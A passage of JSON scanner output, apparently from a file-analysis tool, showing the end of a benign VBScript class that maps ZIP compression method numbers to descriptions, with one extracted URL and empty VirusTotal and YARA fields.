            "\t\t\tlstrReturn = lstrReturn & Mid(lstrBits, (llngNumber * 4) + 1, 4) & \".\"",
            "\t\tNext",
            "\t\tBitMask = Left(lstrReturn, 19)",
            "\tEnd Property",
            "\tProperty Get CompressionMethodString()",
            "\t\tSelect Case CompressionMethod",
            "\t\t\tCase 0 CompressionMethodString = \"The file is stored (no compression)\"",
            "\t\t\tCase 1 CompressionMethodString = \"The file is Shrunk\"",
            "\t\t\tCase 2 CompressionMethodString = \"The file is Reduced with compression factor 1\"",
            "\t\t\tCase 3 CompressionMethodString = \"The file is Reduced with compression factor 2\"",
            "\t\t\tCase 4 CompressionMethodString = \"The file is Reduced with compression factor 3\"",
            "\t\t\tCase 5 CompressionMethodString = \"The file is Reduced with compression factor 4\"",
            "\t\t\tCase 6 CompressionMethodString = \"The file is Imploded\"",
            "\t\t\tCase 7 CompressionMethodString = \"Reserved for Tokenizing compression algorithm\"",
            "\t\t\tCase 8 CompressionMethodString = \"The file is Deflated\"",
            "\t\t\tCase 9 CompressionMethodString = \"Reserved for enhanced Deflating\"",
            "\t\t\tCase 10 CompressionMethodString = \"PKWARE Date Compression Library Imploding\"",
            "\t\t\tCase Else CompressionMethodString = \"Unhandled Copression type: \" & CompressionMethod",
            "\t\tEnd Select",
            "\tEnd Property",
            "End Class"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://vnhacker.org"
        ]
    },
    "time": "0:00:00.703068",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
